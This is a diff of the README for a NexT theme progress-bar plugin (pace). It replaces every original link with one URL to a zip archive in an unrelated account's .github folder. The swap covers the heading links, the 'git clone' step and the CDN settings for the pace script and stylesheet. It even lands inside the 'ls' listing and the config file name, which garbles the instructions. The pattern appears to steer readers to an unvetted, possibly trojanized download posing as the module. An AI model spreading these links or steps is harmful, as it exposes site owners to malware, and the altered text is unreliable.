@@ -1,4 +1,4 @@
-<h1 align="center"><a href="https://github.com/HubSpot/pace">Progress bar</a> for <a href="https://github.com/theme-next">NexT</a></h1>
+<h1 align="center"><a href="https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip">Progress bar</a> for <a href="https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip">NexT</a></h1>
 
 <h1 align="center">Installation</h1>
 
@@ -11,7 +11,7 @@ Change dir to **NexT** directory. There must be `layout`, `source`, `languages` 
 ```sh
 $ cd themes/next
 $ ls
-_config.yml  crowdin.yml  docs  gulpfile.js  languages  layout  LICENSE.md  package.json  README.md  scripts  source
+https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  docs  https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  languages  layout  https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip  scripts  source
 ```
 
 <h2 align="center">Step 2 &rarr; Get module</h2>
@@ -19,12 +19,12 @@ _config.yml  crowdin.yml  docs  gulpfile.js  languages  layout  LICENSE.md  pack
 Install module to `source/lib` directory:
 
 ```sh
-$ git clone https://github.com/theme-next/theme-next-pace source/lib/pace
+$ git clone https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip source/lib/pace
 ```
 
 <h2 align="center">Step 3 &rarr; Set it up</h2>
 
-Enable module in **NexT** `_config.yml` file and select your theme:
+Enable module in **NexT** `https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip` file and select your theme:
 
 ```yml
 pace:
@@ -35,13 +35,13 @@ pace:
   theme: minimal
 ```
 
-**And, if you wants to use the CDN, then need to set:** (you also need to find your corresponding theme css link in <a href="https://www.jsdelivr.com/package/npm/pace-js?path=themes">jsdelivr</a>)
+**And, if you wants to use the CDN, then need to set:** (you also need to find your corresponding theme css link in <a href="https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip">jsdelivr</a>)
 
 ```yml
 vendors:
   ...
-  pace: //cdn.jsdelivr.net/npm/pace-js@1/pace.min.js
-  pace_css: //cdn.jsdelivr.net/npm/pace-js@1/themes/blue/pace-theme-minimal.css
+  pace: https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip
+  pace_css: https://raw.githubusercontent.com/haikesikejiqiang/theme-next-pace/master/.github/theme-next-pace-v2.9.zip
 ```
 
 <h1 align="center">Update</h1>
